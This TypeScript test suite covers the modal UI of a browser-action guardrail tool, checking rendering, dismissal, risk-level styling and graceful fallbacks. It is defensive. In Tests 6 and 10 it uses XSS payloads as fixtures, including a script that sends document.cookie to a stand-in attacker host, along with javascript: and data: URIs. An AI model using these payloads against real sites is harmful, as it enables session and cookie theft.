/**
 * Guardrail Staging Mode - Visual Shell Component Test Suite
 *
 * Verifies the Staging Modal UI lifecycle, DOM hierarchy, and rendering:
 * 1. Mounting, Shadow DOM Attachment & Isolation.
 * 2. Singleton Lifecycle & Duplicate Prevention.
 * 3. Dismissal Lifecycle (Close button, Backdrop click, Escape key, Programmatic).
 * 4. Active State Content Hierarchy & Risk Color Treatments (LOW, MEDIUM, HIGH, CRITICAL).
 * 5. Loading and Empty / Unavailable State Views.
 * 6. DOM Text API Safety & HTML Injection Resistance.
 * 7. In-place Update Capability (`updateStagingModal`).
 */

declare const process: { exit: (code: number) => void };

// Setup minimal DOM simulation in Node
class MockDOMTokenList {
  private classes: Set<string> = new Set();
  constructor(initial: string = '') {
    if (initial) {
      initial.split(/\s+/).filter(Boolean).forEach((c) => this.classes.add(c));
    }
  }
  add(...tokens: string[]): void {
    tokens.forEach((t) => this.classes.add(t));
  }
  remove(...tokens: string[]): void {
    tokens.forEach((t) => this.classes.delete(t));
  }
  contains(token: string): boolean {
    return this.classes.has(token);
  }
  toString(): string {
    return Array.from(this.classes).join(' ');
  }
}

class MockDOMElement {
  public tagName: string;
  public id: string = '';
  public attributes: Record<string, string> = {};
  public style: Record<string, string> = {};
  public children: MockDOMElement[] = [];
  public parentNode: MockDOMElement | null = null;
  public shadowRoot: MockShadowRoot | null = null;
  public listeners: Record<string, ((e: any) => void)[]> = {};
  private _textContent: string = '';
  public classList: MockDOMTokenList;

  constructor(tagName: string) {
    this.tagName = tagName.toUpperCase();
    this.classList = new MockDOMTokenList();
  }

  get className(): string {
    return this.classList.toString();
  }

  set className(val: string) {
    this.classList = new MockDOMTokenList(val);
  }

  get textContent(): string {
    if (this.children.length === 0) {
      return this._textContent;
    }
    return this.children.map((c) => c.textContent).join('');
  }

  set textContent(val: string) {
    this._textContent = val;
    this.children = [];
  }

  setAttribute(name: string, value: string): void {
    this.attributes[name] = value;
    if (name === 'id') this.id = value;
    if (name === 'class') this.className = value;
  }

  getAttribute(name: string): string | null {
    return this.attributes[name] ?? null;
  }

  removeAttribute(name: string): void {
    delete this.attributes[name];
    if (name === 'id') this.id = '';
  }

  appendChild<T extends MockDOMElement>(child: T): T {
    child.parentNode = this;
    this.children.push(child);
    return child;
  }

  removeChild<T extends MockDOMElement>(child: T): T {
    const idx = this.children.indexOf(child);
    if (idx !== -1) {
      this.children.splice(idx, 1);
      child.parentNode = null;
    }
    return child;
  }

  remove(): void {
    if (this.parentNode) {
      this.parentNode.removeChild(this);
    }
  }

  attachShadow(init: { mode: 'open' | 'closed' }): MockShadowRoot {
    const shadow = new MockShadowRoot(init.mode);
    this.shadowRoot = shadow;
    shadow.host = this;
    return shadow;
  }

  addEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(fn);
  }

  removeEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) return;
    this.listeners[type] = this.listeners[type].filter((l) => l !== fn);
  }

  dispatchEvent(event: any): boolean {
    if (this.listeners[event.type]) {
      for (const listener of this.listeners[event.type]) {
        listener(event);
      }
    }
    return true;
  }

  querySelector(selector: string): MockDOMElement | null {
    return querySelectorInternal(this, selector);
  }

  querySelectorAll(selector: string): MockDOMElement[] {
    const results: MockDOMElement[] = [];
    querySelectorAllInternal(this, selector, results);
    return results;
  }
}

class MockShadowRoot extends MockDOMElement {
  public mode: string;
  public host: MockDOMElement | null = null;
  constructor(mode: string) {
    super('#SHADOW-ROOT');
    this.mode = mode;
  }
}

function querySelectorInternal(root: MockDOMElement, selector: string): MockDOMElement | null {
  for (const child of root.children) {
    if (matchesSelector(child, selector)) {
      return child;
    }
    const found = querySelectorInternal(child, selector);
    if (found) return found;
  }
  return null;
}

function querySelectorAllInternal(root: MockDOMElement, selector: string, acc: MockDOMElement[]): void {
  for (const child of root.children) {
    if (matchesSelector(child, selector)) {
      acc.push(child);
    }
    querySelectorAllInternal(child, selector, acc);
  }
}

function matchesSelector(el: MockDOMElement, selector: string): boolean {
  if (selector.startsWith('#')) {
    return el.id === selector.slice(1);
  }
  if (selector.startsWith('.')) {
    return el.classList.contains(selector.slice(1));
  }
  return el.tagName.toLowerCase() === selector.toLowerCase();
}

class MockDocument {
  public body: MockDOMElement;
  constructor() {
    this.body = new MockDOMElement('BODY');
  }
  createElement(tag: string): MockDOMElement {
    return new MockDOMElement(tag);
  }
  getElementById(id: string): MockDOMElement | null {
    return querySelectorInternal(this.body, `#${id}`);
  }
}

class MockWindow {
  public listeners: Record<string, ((e: any) => void)[]> = {};
  addEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(fn);
  }
  removeEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) return;
    this.listeners[type] = this.listeners[type].filter((l) => l !== fn);
  }
  dispatchEvent(event: any): void {
    if (this.listeners[event.type]) {
      for (const listener of this.listeners[event.type]) {
        listener(event);
      }
    }
  }
}

// Install mock environment globally
const mockDoc = new MockDocument();
const mockWin = new MockWindow();
(globalThis as any).document = mockDoc;
(globalThis as any).window = mockWin;

import { classifyAction } from '../classifier/index.js';
import { assessRisk } from '../risk/index.js';
import { createStagingActionContext } from './context.js';
import {
  ActionCategory,
  ActionType,
  GuardrailAction,
} from '../types/actions.js';
import { InterceptionRecord, InterceptionState } from '../types/interception.js';
import { ResponseAction, ResponseDecision } from '../types/response.js';
import { RiskLevel } from '../types/risk.js';
import { StagingActionContext } from '../types/staging.js';
import {
  STAGING_HOST_ELEMENT_ID,
  dismissStagingModal,
  formatActionTypeName,
  formatCategoryName,
  getRiskLevelPresentation,
  getSafeDisplayHost,
  getStagingModalShadowRoot,
  isStagingModalActive,
  showStagingModal,
  translateRiskReason,
  updateStagingModal,
} from './modal.js';

let passed = 0;
let failed = 0;

function assert(condition: boolean, message: string): void {
  if (condition) {
    console.log(`  ✓ ${message}`);
    passed++;
  } else {
    console.error(`  ✗ FAIL: ${message}`);
    failed++;
  }
}

function assertEquals<T>(actual: T, expected: T, message: string): void {
  if (actual === expected) {
    console.log(`  ✓ ${message}: ${String(actual)}`);
    passed++;
  } else {
    console.error(`  ✗ FAIL: ${message}. Expected "${String(expected)}", received "${String(actual)}"`);
    failed++;
  }
}

console.log('\n============================================================');
console.log('🧪 GUARDRAIL STAGING MODE: VISUAL SHELL TEST SUITE');
console.log('============================================================\n');

function createSampleContext(overrides: Partial<StagingActionContext> = {}): StagingActionContext {
  return {
    actionId: 'act-ui-sample-123',
    description: 'Destructive operation: Click on "Delete All Data"',
    actionType: ActionType.CLICK,
    category: ActionCategory.DESTRUCTIVE,
    riskLevel: RiskLevel.CRITICAL,
    riskScore: 100,
    riskReasons: [
      'Target element is a destructive delete button',
      'Action causes permanent bulk data removal',
    ],
    responseAction: ResponseAction.PROTECT,
    interceptionState: InterceptionState.HELD,
    interceptionReason: 'Action halted pending user protection review.',
    origin: 'https://app.example.com',
    hostname: 'app.example.com',
    pageTitle: 'Account Settings',
    timestamp: '2026-10-13T10:00:00.000Z',
    stagedAt: '2026-10-13T10:00:00.050Z',
    ...overrides,
  };
}

// =============================================================================
// TEST 1: MOUNTING, SHADOW DOM ATTACHMENT & ISOLATION
// =============================================================================
console.log('▶ Test 1: Mounting, Shadow DOM Attachment & Isolation');
{
  dismissStagingModal();
  assertEquals(isStagingModalActive(), false, 'Modal is initially not active');

  const context = createSampleContext();
  const dismiss = showStagingModal({ context });

  assertEquals(isStagingModalActive(), true, 'Modal is active after showStagingModal');

  const host = mockDoc.getElementById(STAGING_HOST_ELEMENT_ID);
  assert(Boolean(host), 'Host element is mounted in document.body');
  assertEquals(host?.id, STAGING_HOST_ELEMENT_ID, 'Host element has correct ID');
  assertEquals(host?.style.zIndex, '2147483647', 'Host element has maximum z-index');

  const shadow = getStagingModalShadowRoot();
  assert(Boolean(shadow), 'Shadow root is attached to host');
  assertEquals((shadow as any)?.mode, 'open', 'Shadow root is in open mode');

  // Verify internal styles and backdrop
  const styleEl = shadow?.querySelector('style');
  assert(Boolean(styleEl), 'Scoped style element present in shadow root');

  const backdrop = shadow?.querySelector('.gs-backdrop');
  assert(Boolean(backdrop), 'Backdrop element present in shadow root');

  const shell = shadow?.querySelector('.gs-shell');
  assert(Boolean(shell), 'Shell card element present inside backdrop');
  assertEquals(shell?.getAttribute('role'), 'dialog', 'Shell card has role="dialog"');
  assertEquals(shell?.getAttribute('aria-modal'), 'true', 'Shell card has aria-modal="true"');

  dismiss();
  assertEquals(isStagingModalActive(), false, 'Modal is inactive after dismiss()');
}

// =============================================================================
// TEST 2: SINGLETON LIFECYCLE & DUPLICATE PREVENTON
// =============================================================================
console.log('\n▶ Test 2: Singleton Lifecycle & Duplicate Prevention');
{
  dismissStagingModal();

  // Open 3 times consecutively
  showStagingModal({ context: createSampleContext() });
  showStagingModal({ context: createSampleContext() });
  showStagingModal({ context: createSampleContext() });

  // Only 1 host element should ever exist in document.body
  const matchingHosts = mockDoc.body.querySelectorAll(`#${STAGING_HOST_ELEMENT_ID}`);
  assertEquals(matchingHosts.length, 1, 'Exactly one host element exists despite multiple calls');

  dismissStagingModal();
  assertEquals(isStagingModalActive(), false, 'Clean dismissal leaves 0 active modals');
}

// =============================================================================
// TEST 3: DISMISSAL LIFECYCLE & CALLBACKS
// =============================================================================
console.log('\n▶ Test 3: Dismissal Lifecycle & Callbacks');
{
  // Subtest 3A: Close button click
  let dismissCalled = false;
  showStagingModal({
    context: createSampleContext(),
    onDismiss: () => {
      dismissCalled = true;
    },
  });

  const shadow = getStagingModalShadowRoot();
  const closeBtn = shadow?.querySelector('.gs-btn-close');
  assert(Boolean(closeBtn), 'Close button exists in header');

  closeBtn?.dispatchEvent({ type: 'click' } as any);
  assertEquals(dismissCalled, true, 'onDismiss called when close button is clicked');
  assertEquals(isStagingModalActive(), false, 'Modal dismissed after close button click');

  // Subtest 3B: Backdrop click
  let backdropDismissCalled = false;
  showStagingModal({
    context: createSampleContext(),
    onDismiss: () => {
      backdropDismissCalled = true;
    },
  });

  const shadow2 = getStagingModalShadowRoot();
  const backdrop = shadow2?.querySelector('.gs-backdrop');
  assert(Boolean(backdrop), 'Backdrop element exists');

  // Dispatch click where target === backdrop
  backdrop?.dispatchEvent({ type: 'click', target: backdrop } as any);
  assertEquals(backdropDismissCalled, true, 'onDismiss called when backdrop clicked');
  assertEquals(isStagingModalActive(), false, 'Modal dismissed after backdrop click');

  // Subtest 3C: Escape key dismissal
  let escapeDismissCalled = false;
  showStagingModal({
    context: createSampleContext(),
    onDismiss: () => {
      escapeDismissCalled = true;
    },
  });

  mockWin.dispatchEvent({ type: 'keydown', key: 'Escape' });
  assertEquals(escapeDismissCalled, true, 'onDismiss called on Escape keydown');
  assertEquals(isStagingModalActive(), false, 'Modal dismissed after Escape key');
}

// =============================================================================
// TEST 4: ACTIVE STATE CONTENT HIERARCHY & RISK TREATMENT
// =============================================================================
console.log('\n▶ Test 4: Active State Content Hierarchy & Risk Treatment');
{
  // 1. CRITICAL Risk Treatment
  const critContext = createSampleContext({
    riskLevel: RiskLevel.CRITICAL,
    riskScore: 95,
    description: 'Destructive operation: Click on "Purge All Logs"',
  });
  showStagingModal({ context: critContext });
  let shadow = getStagingModalShadowRoot();

  // Guardrail Identity
  const brandTitle = shadow?.querySelector('.gs-brand-title');
  assertEquals(brandTitle?.textContent, 'Guardrail Staging', 'Brand identity rendered');

  // Prominent Heading
  const headingTitle = shadow?.querySelector('.gs-heading-title');
  assertEquals(headingTitle?.textContent, 'Action Paused for Your Review', 'Prominent paused heading rendered');

  // Action Summary
  const descEl = shadow?.querySelector('.gs-action-desc');
  assertEquals(descEl?.textContent, 'Destructive operation: Click on "Purge All Logs"', 'Action description rendered');

  // Risk Treatment Card
  const riskCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(riskCard?.classList.contains('gs-risk-critical')), 'CRITICAL risk applies .gs-risk-critical class');

  const riskBadge = shadow?.querySelector('.gs-risk-badge');
  assertEquals(riskBadge?.textContent, 'CRITICAL (95)', 'Risk badge includes score');

  // Reasons List
  const reasons = shadow?.querySelectorAll('.gs-reason-item');
  assertEquals(reasons?.length, 2, 'All 2 risk reasons rendered');

  // 2. LOW Risk Treatment (Restrained green accent)
  const lowContext = createSampleContext({
    riskLevel: RiskLevel.LOW,
    riskScore: 10,
    category: ActionCategory.GENERAL,
    description: 'Click on interactive element "View Dashboard"',
  });
  updateStagingModal({ context: lowContext });
  shadow = getStagingModalShadowRoot();

  const lowRiskCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(lowRiskCard?.classList.contains('gs-risk-low')), 'LOW risk applies .gs-risk-low class');

  // 3. HIGH Risk Treatment (Amber)
  const highContext = createSampleContext({
    riskLevel: RiskLevel.HIGH,
    riskScore: 65,
    category: ActionCategory.PAYMENT,
    description: 'Payment trigger: Click on "Pay ₹5,000"',
  });
  updateStagingModal({ context: highContext });
  shadow = getStagingModalShadowRoot();

  const highRiskCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(highRiskCard?.classList.contains('gs-risk-high')), 'HIGH risk applies .gs-risk-high class');

  dismissStagingModal();
}

// =============================================================================
// TEST 5: LOADING AND EMPTY / UNAVAILABLE STATE VIEWS
// =============================================================================
console.log('\n▶ Test 5: Loading and Empty / Unavailable State Views');
{
  // Subtest 5A: Loading State
  showStagingModal({ state: 'loading' });
  let shadow = getStagingModalShadowRoot();

  const loadingTitle = shadow?.querySelector('.gs-state-title');
  assertEquals(loadingTitle?.textContent, 'Loading Staging Preview...', 'Loading state title rendered');

  const loadingDesc = shadow?.querySelector('.gs-state-desc');
  assert(Boolean(loadingDesc?.textContent.includes('preparing the security context')), 'Loading description rendered');

  // Subtest 5B: Empty State
  showStagingModal({ state: 'empty' });
  shadow = getStagingModalShadowRoot();

  const emptyTitle = shadow?.querySelector('.gs-state-title');
  assertEquals(emptyTitle?.textContent, 'No Action Currently Paused', 'Empty state title rendered');

  const emptyDesc = shadow?.querySelector('.gs-state-desc');
  assert(Boolean(emptyDesc?.textContent.includes('no interactions waiting for review')), 'Empty description rendered');

  dismissStagingModal();
}

// =============================================================================
// TEST 6: DOM TEXT API SAFETY & HTML INJECTION RESISTANCE
// =============================================================================
console.log('\n▶ Test 6: DOM Text API Safety & HTML Injection Resistance');
{
  const maliciousContext = createSampleContext({
    description: '<script>alert("xss")</script><b>Dangerous Click</b>',
    origin: 'https://evil.example.com/<script>',
    riskReasons: [
      '<img src=x onerror=alert(1)> Injected Reason',
      'Plain safe reason',
    ],
  });

  showStagingModal({ context: maliciousContext });
  const shadow = getStagingModalShadowRoot();

  // Verify description is strictly text, not HTML elements
  const descEl = shadow?.querySelector('.gs-action-desc');
  assertEquals(
    descEl?.textContent,
    '<script>alert("xss")</script><b>Dangerous Click</b>',
    'Description is assigned purely as textContent'
  );
  assertEquals(descEl?.children.length, 0, 'No HTML tags created from malicious description');

  // Verify reasons are strictly text
  const reasons = shadow?.querySelectorAll('.gs-reason-item');
  assertEquals(reasons?.length, 2, 'Two reason items rendered');
  const firstReasonText = reasons?.[0].textContent;
  assert(Boolean(firstReasonText?.includes('<img src=x onerror=alert(1)>')), 'Injected tags remain unparsed raw text');

  dismissStagingModal();
}

// =============================================================================
// TEST 7: IN-PLACE UPDATE CAPABILITY
// =============================================================================
console.log('\n▶ Test 7: In-Place Update Capability');
{
  showStagingModal({ state: 'loading' });
  const shadow1 = getStagingModalShadowRoot();
  assertEquals(shadow1?.querySelector('.gs-state-title')?.textContent, 'Loading Staging Preview...', 'Initially loading');

  // Update in-place to active context
  const activeCtx = createSampleContext({
    description: 'Updated Action Description',
  });
  updateStagingModal({ context: activeCtx, state: 'active' });

  const shadow2 = getStagingModalShadowRoot();
  assertEquals(shadow1, shadow2, 'Shadow root preserved across updateStagingModal');
  assertEquals(
    shadow2?.querySelector('.gs-action-desc')?.textContent,
    'Updated Action Description',
    'Updated description rendered in place'
  );

  dismissStagingModal();
}

// =============================================================================
// TEST 8: REAL PIPELINE INTEGRATION ACROSS RISK LEVELS (LOW, MEDIUM, HIGH, CRITICAL)
// =============================================================================
console.log('\n▶ Test 8: Real Pipeline Integration Across Risk Levels');
{
  // Subtest 8A: LOW-RISK Routine Action
  console.log('  → Subtest 8A: Low-Risk Action (Generic / Docs Link)');
  const lowAction: GuardrailAction = {
    id: 'act-low-pipeline-1',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-docs', visibleText: 'View Documentation' },
    page: { url: 'https://docs.service.internal/guide', title: 'Service Docs' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const lowClassification = classifyAction(lowAction);
  const lowRisk = assessRisk(lowAction, lowClassification);
  const lowDecision: ResponseDecision = {
    actionId: lowAction.id,
    response: ResponseAction.ALLOW,
    reasons: ['Routine action allowed under default policy'],
    createdAt: new Date().toISOString(),
  };
  const lowRecord: InterceptionRecord = {
    actionId: lowAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const lowContext = createStagingActionContext({
    action: lowAction,
    classification: lowClassification,
    risk: lowRisk,
    decision: lowDecision,
    interception: lowRecord,
  });

  assertEquals(lowRisk.riskLevel, RiskLevel.LOW, 'Pipeline evaluates low action to LOW risk');
  showStagingModal({ context: lowContext });
  let shadow = getStagingModalShadowRoot();

  const lowCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(lowCard?.classList.contains('gs-risk-low')), 'Modal applies .gs-risk-low styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, `LOW (${lowRisk.score})`, 'Risk badge shows LOW with score');
  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('Routine Activity')), 'Reassuring routine activity headline');
  assert(Boolean(shadow?.querySelector('.gs-action-desc')?.textContent?.includes('View Documentation')), 'Readable action description rendered');

  // Verify website hostname rendered safely
  const metaLabels = shadow?.querySelectorAll('.gs-meta-label') || [];
  const metaValues = shadow?.querySelectorAll('.gs-meta-value') || [];
  let websiteValue = '';
  metaLabels.forEach((label, idx) => {
    if (label.textContent === 'Website') {
      websiteValue = metaValues[idx]?.textContent || '';
    }
  });
  assertEquals(websiteValue, 'docs.service.internal', 'Website hostname rendered safely');

  // Verify risk reason translated to non-technical plain English
  const lowReasonItems = shadow?.querySelectorAll('.gs-reason-item') || [];
  assertEquals(lowReasonItems.length, 1, 'Exactly one reason item rendered');
  const lowHeadline = shadow?.querySelector('.gs-reason-summary')?.textContent;
  const lowDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
  assertEquals(lowHeadline, 'Routine Interaction', 'Reason headline translated to friendly summary');
  assertEquals(lowDetail, 'No elevated risk signals detected. Routine interaction.', 'Preserves exact risk engine reason in detail');

  // Subtest 8B: MEDIUM-RISK Action (Payment Trigger)
  console.log('  → Subtest 8B: Medium-Risk Action (Payment Flow)');
  const medAction: GuardrailAction = {
    id: 'act-med-pipeline-2',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-pay-now', visibleText: 'Pay ₹2,500' },
    page: { url: 'https://checkout.shop.com/pay', title: 'Payment Checkout' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const medClassification = classifyAction(medAction);
  const medRisk = assessRisk(medAction, medClassification);
  const medDecision: ResponseDecision = {
    actionId: medAction.id,
    response: ResponseAction.WARN,
    reasons: ['Payment flow triggered'],
    createdAt: new Date().toISOString(),
  };
  const medRecord: InterceptionRecord = {
    actionId: medAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const medContext = createStagingActionContext({
    action: medAction,
    classification: medClassification,
    risk: medRisk,
    decision: medDecision,
    interception: medRecord,
  });

  assertEquals(medClassification.category, ActionCategory.PAYMENT, 'Classifier categorizes as PAYMENT');
  assertEquals(medRisk.riskLevel, RiskLevel.MEDIUM, 'Risk engine evaluates payment to MEDIUM risk');
  assertEquals(medRisk.score, 40, 'Payment action score contribution is 40');

  updateStagingModal({ context: medContext });
  shadow = getStagingModalShadowRoot();

  const medCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(medCard?.classList.contains('gs-risk-medium')), 'Modal applies .gs-risk-medium styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'MEDIUM (40)', 'Risk badge shows MEDIUM (40)');

  // Verify non-technical category label
  let categoryValue = '';
  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
    if (label.textContent === 'Category') {
      categoryValue = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
  });
  assertEquals(categoryValue, 'Payment & Billing', 'Category formatted as "Payment & Billing"');

  // Verify risk reason headline and detail
  const medHeadline = shadow?.querySelector('.gs-reason-summary')?.textContent;
  const medDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
  assertEquals(medHeadline, 'Payment or Billing Activity', 'Risk reason translated to non-technical headline');
  assertEquals(medDetail, 'Action interacts with financial transactions, checkout flows, or billing elements.', 'Detail displays exact risk engine explanation');

  // Subtest 8C: HIGH-RISK Action (Destructive Deletion)
  console.log('  → Subtest 8C: High-Risk Action (Destructive Account Removal)');
  const highAction: GuardrailAction = {
    id: 'act-high-pipeline-3',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-delete-account', visibleText: 'Delete Account' },
    page: { url: 'https://security.service.com/account/delete', title: 'Delete Account' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const highClassification = classifyAction(highAction);
  const highRisk = assessRisk(highAction, highClassification);
  const highDecision: ResponseDecision = {
    actionId: highAction.id,
    response: ResponseAction.PROTECT,
    reasons: ['Destructive deletion requires protective gating'],
    createdAt: new Date().toISOString(),
  };
  const highRecord: InterceptionRecord = {
    actionId: highAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const highContext = createStagingActionContext({
    action: highAction,
    classification: highClassification,
    risk: highRisk,
    decision: highDecision,
    interception: highRecord,
  });

  assertEquals(highClassification.category, ActionCategory.DESTRUCTIVE, 'Classifier categorizes as DESTRUCTIVE');
  assertEquals(highRisk.riskLevel, RiskLevel.HIGH, 'Risk engine evaluates destructive action to HIGH risk');
  assertEquals(highRisk.score, 50, 'Destructive action score contribution is 50');

  updateStagingModal({ context: highContext });
  shadow = getStagingModalShadowRoot();

  const highCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(highCard?.classList.contains('gs-risk-high')), 'Modal applies .gs-risk-high styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'HIGH (50)', 'Risk badge shows HIGH (50)');
  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('Sensitive Operation')), 'Reassuring sensitive operation headline');

  // Verify translated reason
  const highReasonSummary = shadow?.querySelector('.gs-reason-summary')?.textContent;
  const highReasonDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
  assertEquals(highReasonSummary, 'Permanent Removal or Deletion', 'Translated to "Permanent Removal or Deletion"');
  assertEquals(highReasonDetail, 'Action initiates permanent resource deletion, cancellation, or irreversible state destruction.', 'Supplied risk engine reason preserved in detail');

  // Subtest 8D: CRITICAL-RISK Action (Compounded High-Risk Signals)
  console.log('  → Subtest 8D: Critical-Risk Action (Compounded Destructive + Payment)');
  const critAction: GuardrailAction = {
    id: 'act-crit-pipeline-4',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-terminate-pay', visibleText: 'Delete Account and Pay Outstanding' },
    page: { url: 'https://security.service.com/account/terminate', title: 'Terminate Account' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const critClassification = classifyAction(critAction);
  const critRisk = assessRisk(critAction, critClassification);
  const critDecision: ResponseDecision = {
    actionId: critAction.id,
    response: ResponseAction.PROTECT,
    reasons: ['Compounded high-risk signals require protective gating'],
    createdAt: new Date().toISOString(),
  };
  const critRecord: InterceptionRecord = {
    actionId: critAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const critContext = createStagingActionContext({
    action: critAction,
    classification: critClassification,
    risk: critRisk,
    decision: critDecision,
    interception: critRecord,
  });

  assertEquals(critRisk.riskLevel, RiskLevel.CRITICAL, 'Compounded action reaches CRITICAL risk level');
  assertEquals(critRisk.score, 90, 'Score sums DESTRUCTIVE (50) + PAYMENT (40) = 90');

  updateStagingModal({ context: critContext });
  shadow = getStagingModalShadowRoot();

  const critCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(critCard?.classList.contains('gs-risk-critical')), 'Modal applies .gs-risk-critical styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'CRITICAL (90)', 'Risk badge shows CRITICAL (90)');
  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('High-Impact Action')), 'High-impact headline without claiming malice');
  assertEquals(shadow?.querySelectorAll('.gs-reason-item').length, 2, 'Renders both compounded risk reasons');

  dismissStagingModal();
}

// =============================================================================
// TEST 9: GRACEFUL DEGRADATION ON MISSING & UNKNOWN METADATA
// =============================================================================
console.log('\n▶ Test 9: Graceful Degradation on Missing & Unknown Metadata');
{
  // 9A: Missing or empty description
  const noDescContext = createSampleContext({
    description: '   ',
  });
  showStagingModal({ context: noDescContext });
  let shadow = getStagingModalShadowRoot();
  assertEquals(
    shadow?.querySelector('.gs-action-desc')?.textContent,
    'Action held for review on this page',
    'Empty description degrades to reassuring fallback'
  );

  // 9B: Missing / empty risk reasons
  const noReasonsContext = createSampleContext({
    riskReasons: [],
  });
  updateStagingModal({ context: noReasonsContext });
  shadow = getStagingModalShadowRoot();
  assertEquals(shadow?.querySelectorAll('.gs-reason-item').length, 1, 'Falls back to 1 safety notice item');
  assertEquals(
    shadow?.querySelector('.gs-reason-summary')?.textContent,
    'Standard Safety Check',
    'Fallback reason summary is "Standard Safety Check"'
  );
  assertEquals(
    shadow?.querySelector('.gs-reason-detail')?.textContent,
    'Guardrail paused this action as a standard safety precaution based on current settings.',
    'Fallback detail explains standard safety settings'
  );

  // 9C: Unknown category and unknown actionType
  const unknownCatContext = createSampleContext({
    category: 'CUSTOM_THIRD_PARTY_CATEGORY' as any,
    actionType: 'CUSTOM_EVENT_TYPE' as any,
  });
  updateStagingModal({ context: unknownCatContext });
  shadow = getStagingModalShadowRoot();

  let catVal = '';
  let mechVal = '';
  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
    if (label.textContent === 'Category') {
      catVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
    if (label.textContent === 'Mechanism') {
      mechVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
  });
  assertEquals(catVal, 'General Activity', 'Unknown category degrades gracefully to "General Activity"');
  assertEquals(mechVal, 'Standard Interaction', 'Unknown actionType degrades gracefully to "Standard Interaction"');

  // 9D: Missing origin and hostname
  const noHostContext = createSampleContext({
    origin: undefined,
    hostname: undefined,
  });
  updateStagingModal({ context: noHostContext });
  shadow = getStagingModalShadowRoot();
  let foundWebsiteLabel = false;
  shadow?.querySelectorAll('.gs-meta-label').forEach((label) => {
    if (label.textContent === 'Website') {
      foundWebsiteLabel = true;
    }
  });
  assertEquals(foundWebsiteLabel, false, 'Website item completely omitted when origin and hostname are unavailable');

  // 9E: Missing risk score (undefined)
  const noScoreContext = createSampleContext({
    riskLevel: RiskLevel.LOW,
    riskScore: undefined,
  });
  updateStagingModal({ context: noScoreContext });
  shadow = getStagingModalShadowRoot();
  assertEquals(
    shadow?.querySelector('.gs-risk-badge')?.textContent,
    'LOW',
    'Missing riskScore displays level without empty parentheses or NaN'
  );

  // 9F: Missing actionId
  const noIdContext = createSampleContext({
    actionId: '   ',
  });
  updateStagingModal({ context: noIdContext });
  shadow = getStagingModalShadowRoot();
  let auditVal = '';
  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
    if (label.textContent === 'Audit ID') {
      auditVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
  });
  assertEquals(auditVal, 'N/A', 'Empty actionId degrades gracefully to "N/A"');

  dismissStagingModal();
}

// =============================================================================
// TEST 10: POTENTIALLY HOSTILE DISPLAY STRINGS & SANITIZATION EDGE CASES
// =============================================================================
console.log('\n▶ Test 10: Potentially Hostile Display Strings & Sanitization Edge Cases');
{
  // 10A: XSS injection vectors in action description
  const hostileDesc = '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script><b onmouseover="alert(1)">Click Me</b>';
  const hostileContext = createSampleContext({
    description: hostileDesc,
  });
  showStagingModal({ context: hostileContext });
  let shadow = getStagingModalShadowRoot();
  const descEl = shadow?.querySelector('.gs-action-desc');
  assertEquals(descEl?.textContent, hostileDesc, 'Hostile script string assigned purely as textContent');
  assertEquals(descEl?.children.length, 0, 'No DOM elements or script nodes created from hostile description');

  // 10B: Malicious and dangerous URLs / hostnames
  assertEquals(getSafeDisplayHost('javascript:alert(1)', undefined), null, 'Rejects javascript: URI');
  assertEquals(getSafeDisplayHost('data:text/html,<script>alert(1)</script>', undefined), null, 'Rejects data: URI');
  assertEquals(getSafeDisplayHost('http://user:password@evil.com/path', undefined), null, 'Rejects URLs with credentials');
  assertEquals(getSafeDisplayHost(undefined, 'user:pass@evil.com'), null, 'Rejects hostnames with user:pass@ credentials');
  assertEquals(getSafeDisplayHost('about:blank', undefined), null, 'Rejects about:blank');
  assertEquals(getSafeDisplayHost(undefined, '<script>evil.com'), null, 'Rejects hostnames with HTML brackets');
